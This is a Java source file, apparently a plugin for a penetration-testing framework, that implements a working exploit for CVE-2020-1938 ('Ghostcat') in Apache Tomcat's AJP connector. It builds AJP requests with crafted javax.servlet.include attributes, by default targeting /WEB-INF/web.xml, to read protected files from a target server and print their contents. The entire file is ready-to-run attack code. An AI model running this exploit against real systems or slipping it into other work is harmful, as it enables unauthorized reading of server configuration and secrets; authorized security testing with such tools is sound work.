package me.gv7.woodpecker.vuldb.CVE_2020_1938.exploit;

import com.github.jrialland.ajpclient.SimpleForwardResponse;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.vuldb.CVE_2017_12615.CVE_2017_12615_Plugin;
import me.gv7.woodpecker.vuldb.CVE_2020_1938.CVE_2020_1938_Plugin;
import me.gv7.woodpecker.vuldb.CVE_2020_1938.utils.AJPClient;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class CVE_2020_1938_CustomExploit implements IExploit {
    public String getExploitTabCaption() {
        return "Csutom Args";
    }

    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder argsUsageBinder = CVE_2020_1938_Plugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        final IArg request_path = CVE_2020_1938_Plugin.pluginHelper.createArg();
        request_path.setName("request_path");
        request_path.setDefaultValue("/docs/favicon.ico");
        request_path.setRequired(true);
        request_path.setDescription("要读的文件");
        args.add(request_path);

        final IArg request_uri = CVE_2017_12615_Plugin.pluginHelper.createArg();
        request_uri.setName("javax.servlet.include.request_uri");
        request_uri.setDefaultValue("/");
        request_uri.setRequired(true);
        request_uri.setDescription("");
        args.add(request_uri);

        final IArg path_info = CVE_2017_12615_Plugin.pluginHelper.createArg();
        path_info.setName("javax.servlet.include.path_info");
        path_info.setDefaultValue("/WEB-INF/web.xml");
        path_info.setRequired(true);
        path_info.setDescription("");
        args.add(path_info);

        final IArg servlet_path = CVE_2017_12615_Plugin.pluginHelper.createArg();
        servlet_path.setName("javax.servlet.include.servlet_path");
        servlet_path.setDefaultValue("/");
        servlet_path.setRequired(true);
        servlet_path.setDescription("");
        args.add(servlet_path);

        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doExploit(ITarget target, Map<String, Object> customArgs, IResultOutput resultOutput) {
        String host = target.getHost();
        int port = target.getPort();
        String requestPath = (String)customArgs.get("request_path");
        String request_uri = (String)customArgs.get("javax.servlet.include.request_uri");
        String path_info = (String)customArgs.get("javax.servlet.include.path_info");
        String servlet_path = (String)customArgs.get("javax.servlet.include.servlet_path");
        AJPClient ajpClient = new AJPClient(host,port,requestPath);
        ajpClient.setRequest_uri(request_uri);
        ajpClient.setPath_info(path_info);
        ajpClient.setServlet_path(servlet_path);
        resultOutput.infoPrintln(String.format("start include file: %s",path_info));
        SimpleForwardResponse response = null;
        try {
            response = ajpClient.send();
        }catch (Exception e){
            resultOutput.errorPrintln(CVE_2020_1938_Plugin.pluginHelper.getThrowableInfo(e));
        }

        if(response != null) {
            resultOutput.infoPrintln(String.format("response status:%d and body:\n",response.getStatusCode()));
            resultOutput.rawPrintln(response.getResponseBodyAsString());
        }else{
            resultOutput.errorPrintln("response is null!");
        }
    }
}
